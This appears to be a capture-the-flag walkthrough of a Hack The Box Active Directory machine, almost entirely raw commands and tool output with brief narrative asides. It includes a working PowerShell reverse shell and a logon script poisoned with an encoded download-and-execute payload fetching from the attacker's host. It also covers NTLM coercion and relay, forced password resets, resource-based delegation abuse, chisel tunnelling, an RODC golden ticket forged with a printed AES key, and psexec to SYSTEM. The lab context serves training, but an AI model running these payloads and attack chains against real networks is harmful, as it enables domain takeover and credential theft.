sudo nmap -sV -sC -p 53,88,389,445,593,636,2179,3268,3269,3389,5985,9389,49666,49670,49671,49673,49674,49899,52113 -n -Pn 10.129.244.207
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-06-14 16:29 EEST
Nmap scan report for 10.129.244.207
Host is up (0.049s latency).

PORT      STATE    SERVICE       VERSION
53/tcp    open     domain        Simple DNS Plus
88/tcp    open     kerberos-sec  Microsoft Windows Kerberos (server time: 2026-06-14 21:29:49Z)
389/tcp   open     ldap          Microsoft Windows Active Directory LDAP (Domain: garfield.htb0., Site: Default-First-Site-Name)
445/tcp   open     microsoft-ds?
593/tcp   open     ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open     tcpwrapped
2179/tcp  open     vmrdp?
3268/tcp  open     ldap          Microsoft Windows Active Directory LDAP (Domain: garfield.htb0., Site: Default-First-Site-Name)
3269/tcp  open     tcpwrapped
3389/tcp  open     ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: GARFIELD
|   NetBIOS_Domain_Name: GARFIELD
|   NetBIOS_Computer_Name: DC01
|   DNS_Domain_Name: garfield.htb
|   DNS_Computer_Name: DC01.garfield.htb
|   DNS_Tree_Name: garfield.htb
|   Product_Version: 10.0.17763
|_  System_Time: 2026-06-14T21:30:07+00:00
| ssl-cert: Subject: commonName=DC01.garfield.htb
| Not valid before: 2026-02-13T01:10:36
|_Not valid after:  2026-08-15T01:10:36
|_ssl-date: 2026-06-14T21:30:48+00:00; +8h00m02s from scanner time.
5985/tcp  open     http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open     mc-nmf        .NET Message Framing
49666/tcp filtered unknown
49670/tcp filtered unknown
49671/tcp filtered unknown
49673/tcp filtered unknown
49674/tcp filtered unknown
49899/tcp filtered unknown
52113/tcp filtered unknown
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-06-14T21:30:08
|_  start_date: N/A
|_clock-skew: mean: 8h00m01s, deviation: 0s, median: 8h00m01s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 67.42 seconds

---

crackmapexec smb 10.129.244.207 -u  j.arbuckle -p 'Th1sD4mnC4t!@1978' --shares
SMB         10.129.244.207  445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:garfield.htb) (signing:True) (SMBv1:False)
SMB         10.129.244.207  445    DC01             [+] garfield.htb\j.arbuckle:Th1sD4mnC4t!@1978 
SMB         10.129.244.207  445    DC01             [*] Enumerated shares
SMB         10.129.244.207  445    DC01             Share           Permissions     Remark
SMB         10.129.244.207  445    DC01             -----           -----------     ------
SMB         10.129.244.207  445    DC01             ADMIN$                          Remote Admin
SMB         10.129.244.207  445    DC01             C$                              Default share
SMB         10.129.244.207  445    DC01             IPC$            READ            Remote IPC
SMB         10.129.244.207  445    DC01             NETLOGON        READ            Logon server share 
SMB         10.129.244.207  445    DC01             SYSVOL          READ            Logon server share

---

crackmapexec smb 10.129.244.207 -u  j.arbuckle -p 'Th1sD4mnC4t!@1978' --users
SMB         10.129.244.207  445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:garfield.htb) (signing:True) (SMBv1:False)
SMB         10.129.244.207  445    DC01             [+] garfield.htb\j.arbuckle:Th1sD4mnC4t!@1978 
SMB         10.129.244.207  445    DC01             [*] Trying to dump local users with SAMRPC protocol
SMB         10.129.244.207  445    DC01             [+] Enumerated domain user(s)
SMB         10.129.244.207  445    DC01             garfield.htb\Administrator                  Built-in account for administering the computer/domain
SMB         10.129.244.207  445    DC01             garfield.htb\Guest                          Built-in account for guest access to the computer/domain
SMB         10.129.244.207  445    DC01             garfield.htb\krbtgt                         Key Distribution Center Service Account
SMB         10.129.244.207  445    DC01             garfield.htb\krbtgt_8245                    Key Distribution Center service account for read-only domain controller
SMB         10.129.244.207  445    DC01             garfield.htb\j.arbuckle                     
SMB         10.129.244.207  445    DC01             garfield.htb\l.wilson                       
SMB         10.129.244.207  445    DC01             garfield.htb\l.wilson_adm

---

┌──(root㉿kali)-[/home/kali]
└─# smbclient //10.129.195.112/SYSVOL -U 'j.arbuckle%Th1sD4mnC4t!@1978' -c 'recurse ON; prompt OFF; ls'
  .                                   D        0  Wed Aug 13 07:04:43 2025
  ..                                  D        0  Wed Aug 13 07:04:43 2025
  garfield.htb                       Dr        0  Wed Aug 13 07:04:43 2025

\garfield.htb
  .                                   D        0  Wed Aug 13 07:11:05 2025
  ..                                  D        0  Wed Aug 13 07:11:05 2025
  DfsrPrivate                      DHSr        0  Wed Aug 13 07:11:05 2025
  Policies                            D        0  Wed Aug 13 07:04:48 2025
  scripts                             D        0  Tue Jan 27 17:13:47 2026

\garfield.htb\DfsrPrivate
NT_STATUS_ACCESS_DENIED listing \garfield.htb\DfsrPrivate\*

\garfield.htb\Policies
  .                                   D        0  Wed Aug 13 07:04:48 2025
  ..                                  D        0  Wed Aug 13 07:04:48 2025
  {31B2F340-016D-11D2-945F-00C04FB984F9}      D        0  Wed Aug 13 07:04:48 2025
  {6AC1786C-016F-11D2-945F-00C04fB984F9}      D        0  Wed Aug 13 07:04:48 2025

\garfield.htb\scripts
  .                                   D        0  Tue Jan 27 17:13:47 2026
  ..                                  D        0  Tue Jan 27 17:13:47 2026
  printerDetect.bat                   A      217  Fri Sep 12 18:20:29 2025

\garfield.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}
  .                                   D        0  Wed Aug 13 07:04:48 2025
  ..                                  D        0  Wed Aug 13 07:04:48 2025
  GPT.INI                             A       22  Tue Sep  9 11:55:03 2025
  MACHINE                             D        0  Wed Aug 13 07:11:08 2025
  USER                                D        0  Wed Aug 13 07:04:48 2025

\garfield.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}
  .                                   D        0  Wed Aug 13 07:04:48 2025
  ..                                  D        0  Wed Aug 13 07:04:48 2025
  GPT.INI                             A       23  Fri Feb 13 20:14:50 2026
  MACHINE                             D        0  Tue Sep  9 12:43:51 2025
  USER                                D        0  Wed Aug 13 07:04:48 2025

\garfield.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE
  .                                   D        0  Wed Aug 13 07:11:08 2025
  ..                                  D        0  Wed Aug 13 07:11:08 2025
  Microsoft                           D        0  Wed Aug 13 07:04:48 2025
  Registry.pol                        A     2792  Wed Aug 13 07:11:08 2025

\garfield.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\USER
  .                                   D        0  Wed Aug 13 07:04:48 2025
  ..                                  D        0  Wed Aug 13 07:04:48 2025

\garfield.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE
  .                                   D        0  Tue Sep  9 12:43:51 2025
  ..                                  D        0  Tue Sep  9 12:43:51 2025
  Microsoft                           D        0  Wed Aug 13 07:04:48 2025
  Scripts                             D        0  Tue Sep  9 12:43:51 2025

\garfield.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\USER
  .                                   D        0  Wed Aug 13 07:04:48 2025
  ..                                  D        0  Wed Aug 13 07:04:48 2025

\garfield.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Microsoft
  .                                   D        0  Wed Aug 13 07:04:48 2025
  ..                                  D        0  Wed Aug 13 07:04:48 2025
  Windows NT                          D        0  Wed Aug 13 07:04:48 2025

\garfield.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\Microsoft
  .                                   D        0  Wed Aug 13 07:04:48 2025
  ..                                  D        0  Wed Aug 13 07:04:48 2025
  Windows NT                          D        0  Tue Sep  9 12:44:18 2025

\garfield.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\Scripts
  .                                   D        0  Tue Sep  9 12:43:51 2025
  ..                                  D        0  Tue Sep  9 12:43:51 2025
  Shutdown                            D        0  Tue Sep  9 12:43:51 2025
  Startup                             D        0  Tue Sep  9 12:43:51 2025

\garfield.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Microsoft\Windows NT
  .                                   D        0  Wed Aug 13 07:04:48 2025
  ..                                  D        0  Wed Aug 13 07:04:48 2025
  SecEdit                             D        0  Tue Sep  9 11:55:03 2025

\garfield.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\Microsoft\Windows NT
  .                                   D        0  Tue Sep  9 12:44:18 2025
  ..                                  D        0  Tue Sep  9 12:44:18 2025
  Audit                               D        0  Tue Sep  9 12:44:18 2025
  SecEdit                             D        0  Fri Feb 13 20:14:50 2026

\garfield.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\Scripts\Shutdown
  .                                   D        0  Tue Sep  9 12:43:51 2025
  ..                                  D        0  Tue Sep  9 12:43:51 2025

\garfield.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\Scripts\Startup
  .                                   D        0  Tue Sep  9 12:43:51 2025
  ..                                  D        0  Tue Sep  9 12:43:51 2025

\garfield.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Microsoft\Windows NT\SecEdit
  .                                   D        0  Tue Sep  9 11:55:03 2025
  ..                                  D        0  Tue Sep  9 11:55:03 2025
  GptTmpl.inf                         A     1098  Tue Sep  9 11:55:03 2025

\garfield.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\Microsoft\Windows NT\Audit
  .                                   D        0  Tue Sep  9 12:44:18 2025
  ..                                  D        0  Tue Sep  9 12:44:18 2025
  audit.csv                           A      535  Tue Sep  9 12:44:34 2025

\garfield.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\Microsoft\Windows NT\SecEdit
  .                                   D        0  Fri Feb 13 20:14:50 2026
  ..                                  D        0  Fri Feb 13 20:14:50 2026
  GptTmpl.inf                         A     3904  Fri Feb 13 20:14:50 2026

---

smbclient //10.129.244.207/SYSVOL -U 'j.arbuckle%Th1sD4mnC4t!@1978' -c 'get garfield.htb\scripts\printerDetect.bat'

@echo off
echo Detecting installed printers...
echo ==============================

wmic printer get Name,DeviceID,PortName,DriverName,Shared,Status /format:table

echo.
echo Printer detection completed.
pause

---

bloodhound-python -u 'j.arbuckle' -p 'Th1sD4mnC4t!@1978' -d garfield.htb -ns 10.129.244.207 -c all --dns-tcp
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: garfield.htb
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
INFO: Connecting to LDAP server: dc01.garfield.htb
INFO: Testing resolved hostname connectivity dead:beef::ee4a:ab04:6a6d:699c
INFO: Trying LDAP connection to dead:beef::ee4a:ab04:6a6d:699c
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 2 computers
INFO: Connecting to LDAP server: dc01.garfield.htb
INFO: Testing resolved hostname connectivity dead:beef::ee4a:ab04:6a6d:699c
INFO: Trying LDAP connection to dead:beef::ee4a:ab04:6a6d:699c
INFO: Found 8 users
INFO: Found 55 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: RODC01.garfield.htb
INFO: Querying computer: DC01.garfield.htb
INFO: Done in 00M 18S

---

GetNPUsers.py garfield.htb/ -usersfile users.txt -dc-ip 10.129.244.207 -no-pass
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

/home/hlib/.local/bin/GetNPUsers.py:165: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  now = datetime.datetime.utcnow() + datetime.timedelta(days=1)
[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User j.arbuckle doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User l.wilson doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User l.wilson_adm doesn't have UF_DONT_REQUIRE_PREAUTH set

---

┌──(root㉿kali)-[/home/kali]
└─# python3 /home/kali/PetitPotam/PetitPotam.py 10.10.14.42 10.129.244.207 -u j.arbuckle -p 'Th1sD4mnC4t!@1978'
/home/kali/PetitPotam/PetitPotam.py:23: SyntaxWarning: invalid escape sequence '\ '

Trying pipe lsarpc
[-] Connecting to ncacn_np:10.129.244.207[\PIPE\lsarpc]
[+] Connected!
[+] Binding to c681d488-d850-11d0-8c52-00c04fd90f7e
[+] Successfully bound!
[-] Sending EfsRpcOpenFileRaw!
[-] Got RPC_ACCESS_DENIED!! EfsRpcOpenFileRaw is probably PATCHED!
[+] OK! Using unpatched function!
[-] Sending EfsRpcEncryptFileSrv!
[+] Got expected ERROR_BAD_NETPATH exception!!
[+] Attack worked!

---

┌──(root㉿kali)-[/home/kali]
└─# impacket-ntlmrelayx -t ldap://10.129.244.207 -smb2support --delegate-access
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Protocol Client DCSYNC loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client RPC loaded..
[*] Protocol Client SMB loaded..
[*] Protocol Client WINRMS loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client SMTP loaded..
[*] Protocol Client MSSQL loaded..
[*] Running in relay mode to single host
[*] Setting up SMB Server on port 445
[*] Setting up HTTP Server on port 80
[*] Setting up WCF Server on port 9389
[*] Setting up RAW Server on port 6666
[*] Setting up WinRM (HTTP) Server on port 5985
[*] Setting up WinRMS (HTTPS) Server on port 5986
[*] Setting up RPC Server on port 135
[*] Multirelay disabled

[*] Servers started, waiting for connections
[*] (SMB): Received connection from 10.129.244.207, attacking target ldap://10.129.244.207
[!] The client requested signing. Relaying to LDAP will not work! (This usually happens when relaying from SMB to LDAP)
[-] (SMB): Authenticating against ldap://10.129.244.207 as GARFIELD/DC01$ FAILED

---

bloodyAD -u j.arbuckle -p 'Th1sD4mnC4t!@1978' -d garfield.htb --host 10.129.244.207 get writable --detail

distinguishedName: CN=Guest,CN=Users,DC=garfield,DC=htb
scriptPath: WRITE

distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=garfield,DC=htb
url: WRITE
wWWHomePage: WRITE

distinguishedName: CN=krbtgt_8245,CN=Users,DC=garfield,DC=htb
scriptPath: WRITE

distinguishedName: CN=Jon Arbuckle,CN=Users,DC=garfield,DC=htb
thumbnailPhoto: WRITE
pager: WRITE
mobile: WRITE
homePhone: WRITE
userSMIMECertificate: WRITE
msDS-ExternalDirectoryObjectId: WRITE
msDS-cloudExtensionAttribute20: WRITE
msDS-cloudExtensionAttribute19: WRITE
msDS-cloudExtensionAttribute18: WRITE
msDS-cloudExtensionAttribute17: WRITE
msDS-cloudExtensionAttribute16: WRITE
msDS-cloudExtensionAttribute15: WRITE
msDS-cloudExtensionAttribute14: WRITE
msDS-cloudExtensionAttribute13: WRITE
msDS-cloudExtensionAttribute12: WRITE
msDS-cloudExtensionAttribute11: WRITE
msDS-cloudExtensionAttribute10: WRITE
msDS-cloudExtensionAttribute9: WRITE
msDS-cloudExtensionAttribute8: WRITE
msDS-cloudExtensionAttribute7: WRITE
msDS-cloudExtensionAttribute6: WRITE
msDS-cloudExtensionAttribute5: WRITE
msDS-cloudExtensionAttribute4: WRITE
msDS-cloudExtensionAttribute3: WRITE
msDS-cloudExtensionAttribute2: WRITE
msDS-cloudExtensionAttribute1: WRITE
msDS-GeoCoordinatesLongitude: WRITE
msDS-GeoCoordinatesLatitude: WRITE
msDS-GeoCoordinatesAltitude: WRITE
msDS-AllowedToActOnBehalfOfOtherIdentity: WRITE
msPKI-CredentialRoamingTokens: WRITE
msDS-FailedInteractiveLogonCountAtLastSuccessfulLogon: WRITE
msDS-FailedInteractiveLogonCount: WRITE
msDS-LastFailedInteractiveLogonTime: WRITE
msDS-LastSuccessfulInteractiveLogonTime: WRITE
msDS-SupportedEncryptionTypes: WRITE
msPKIAccountCredentials: WRITE
msPKIDPAPIMasterKeys: WRITE
msPKIRoamingTimeStamp: WRITE
mSMQDigests: WRITE
mSMQSignCertificates: WRITE
userSharedFolderOther: WRITE
userSharedFolder: WRITE
url: WRITE
otherIpPhone: WRITE
ipPhone: WRITE
assistant: WRITE
primaryInternationalISDNNumber: WRITE
primaryTelexNumber: WRITE
otherMobile: WRITE
otherFacsimileTelephoneNumber: WRITE
userCert: WRITE
scriptPath: WRITE
homePostalAddress: WRITE
personalTitle: WRITE
wWWHomePage: WRITE
otherHomePhone: WRITE
streetAddress: WRITE
otherPager: WRITE
info: WRITE
otherTelephone: WRITE
userCertificate: WRITE
preferredDeliveryMethod: WRITE
registeredAddress: WRITE
internationalISDNNumber: WRITE
x121Address: WRITE
facsimileTelephoneNumber: WRITE
teletexTerminalIdentifier: WRITE
telexNumber: WRITE
telephoneNumber: WRITE
physicalDeliveryOfficeName: WRITE
postOfficeBox: WRITE
postalCode: WRITE
postalAddress: WRITE
street: WRITE
st: WRITE
l: WRITE
c: WRITE

distinguishedName: CN=Liz Wilson,CN=Users,DC=garfield,DC=htb
scriptPath: WRITE

distinguishedName: CN=Liz Wilson ADM,CN=Users,DC=garfield,DC=htb
scriptPath: WRITE

distinguishedName: DC=garfield.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=garfield,DC=htb
dnsNode: CREATE_CHILD
dnsZoneScopeContainer: CREATE_CHILD

distinguishedName: DC=_msdcs.garfield.htb,CN=MicrosoftDNS,DC=ForestDnsZones,DC=garfield,DC=htb
dnsNode: CREATE_CHILD
dnsZoneScopeContainer: CREATE_CHILD

---

cat > shell.ps1 << 'NOEXPAND'
$client = New-Object System.Net.Sockets.TCPClient("10.10.14.196",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String);$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
NOEXPAND

---

PAYLOAD="IEX(New-Object Net.WebClient).downloadString('http://10.10.14.196:8000/shell.ps1')"
ENCODED=$(echo -n "$PAYLOAD" | iconv -t UTF-16LE | base64 -w0)
echo "@echo off" > printerDetect.bat
echo "powershell -nop -w hidden -enc $ENCODED" >> printerDetect.bat

---

smbclient //10.129.244.207/SYSVOL -U 'j.arbuckle%Th1sD4mnC4t!@1978' -c 'cd garfield.htb\scripts\; put printerDetect.bat'

---

bloodyAD -u j.arbuckle -p 'Th1sD4mnC4t!@1978' -d garfield.htb --host 10.129.244.207 set object l.wilson scriptPath -v 'printerDetect.bat'

---

$newpass = ConvertTo-SecureString 'Hacker123!' -AsPlainText -Force
Set-ADAccountPassword -Identity l.wilson_adm -NewPassword $newpass -Reset

---

evil-winrm -i 10.129.244.207 -u 'l.wilson_adm' -p 'Hacker123!'
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\l.wilson_adm\Documents> dir
*Evil-WinRM* PS C:\Users\l.wilson_adm\Documents> type C:\Users\l.wilson_adm\Desktop\user.txt

---

 pulled up BloodHound again — the same tool that had lied to me for hours. But this time I was searching from a different starting point, and this time the graph decided to cooperate. l.wilson_adm had AddSelf on the RODC Administrators group. Not "add anyone" — just "add yourself." One permission, one command, no approval chain.

---

Add-ADGroupMember -Identity "RODC Administrators" -Members l.wilson_adm

*Evil-WinRM* PS C:\Users\l.wilson_adm\Documents> Add-ADGroupMember -Identity "RODC Administrators" -Members l.wilson_adm
*Evil-WinRM* PS C:\Users\l.wilson_adm\Documents> nslookup RODC01.garfield.htb
Server:  localhost
Address:  127.0.0.1

Name:    RODC01.garfield.htb
Address:  192.168.100.2

192.168.100.2. An internal address my Kali box had no route to. I pinged it from DC01 — replies came back instantly. So the two domain controllers could talk to each other, but I was on the outside looking in. I had the title of RODC admin and absolutely no way to use it. Not yet.

---

I needed SYSTEM on RODC01, and being a local admin wouldn't get me there through psexec alone — not without a way to authenticate as a domain admin against its services. That's where RBCD comes in.

The logic is almost absurd when you spell it out: create a machine account out of thin air, tell RODC01 to trust it for delegation, then use that trust to impersonate Administrator. It shouldn't work. But Active Directory's delegation model has always been more permissive than it should be.

---

addcomputer.py garfield.htb/l.wilson_adm:'Hacker123!' -computer-name 'YOURPC$' -computer-pass 'Password123!' -dc-ip 10.129.244.207
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Successfully added machine account YOURPC$ with password Password123!.

---

rbcd.py garfield.htb/l.wilson_adm:'Hacker123!' \
  -delegate-from 'YOURPC$' \
  -delegate-to 'RODC01$' \
  -action write \
  -dc-ip 10.129.244.207

---

getST.py garfield.htb/'YOURPC$':'Password123!' -spn cifs/RODC01.garfield.htb -impersonate Administrator -dc-ip 10.129.244.207 

sudo timedatectl set-ntp false
sudo ntpdate -b 10.129.244.207

after finish 

sudo timedatectl set-ntp true

---

wget https://github.com/jpillora/chisel/releases/download/v1.11.5/chisel_1.11.5_windows_amd64.zip
python3 -m http.server
certutil -urlcache -split -f http://10.10.14.196:9001/chisel.exe C:\Users\l.wilson_adm\Documents\chisel.exe

---

chisel server --reverse -p 8001
.\chisel.exe client 10.10.14.196:8001 R:socks

---

evil-winrm -i 10.129.244.207 -u 'l.wilson_adm' -p 'Hacker123!'
                                        
---

proxychains getST.py garfield.htb/'YOURPC$':'Password123!' -spn cifs/RODC01.garfield.htb -impersonate Administrator -dc-ip 10.129.244.207

export KRB5CCNAME=Administrator@cifs_RODC01.garfield.htb@GARFIELD.HTB.ccache

bloodyAD -u l.wilson_adm -p 'Hacker123!' -d garfield.htb --host 10.129.244.207 set object 'RODC01$' msDS-NeverRevealGroup
bloodyAD -u l.wilson_adm -p 'Hacker123!' -d garfield.htb --host 10.129.244.207 set object 'RODC01$' msDS-RevealOnDemandGroup -v 'CN=Administrator,CN=Users,DC=garfield,DC=htb'

wget https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_Any/Rubeus.exe -O Rubeus_new.exe

certutil -urlcache -split -f http://10.10.14.196:9001/Rubeus.exe C:\Users\l.wilson_adm\Documents\Rubeus.exe

.\Rubeus.exe golden /rodcNumber:8245 /aes256:d6c93cbe006372adb8403630f9e86594f52c8105a52f9b21fef62e9c7a75e240 /user:Administrator /id:500 /domain:garfield.htb /sid:S-1-5-21-2502726253-3859040611-225969357 /outfile:C:\Users\l.wilson_adm\Documents\rodc_golden.kirbi

.\Rubeus_new.exe asktgs /ticket:C:\Users\l.wilson_adm\Documents\rodc_golden_new_2026_04_08_17_26_50_Administrator_to_krbtgt@GARFIELD.HTB.kirbi /service:cifs/DC01.garfield.htb /dc:DC01.garfield.htb /ptt


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
EURDMDEuZ2FyZmllbGQuaHRi

ticketConverter.py tgs.kirbi tgs.ccache
Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 

[*] converting kirbi to ccache...
[+] done

[HTB ] /ctfdata # export KRB5CCNAME=tgs.ccache

[HTB ] /ctfdata # psexec.py garfield.htb/Administrator@DC01.garfield.htb -k -no-pass
Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on DC01.garfield.htb.....
[*] Found writable share ADMIN$
[*] Uploading file giglBUyh.exe
[*] Opening SVCManager on DC01.garfield.htb.....
[*] Creating service YeKx on DC01.garfield.htb.....
[*] Starting service YeKx.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.8385]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> type C:\Users\Administrator\Desktop\root.txt
e4fc2c38238ea9320ef9a39b4511beca
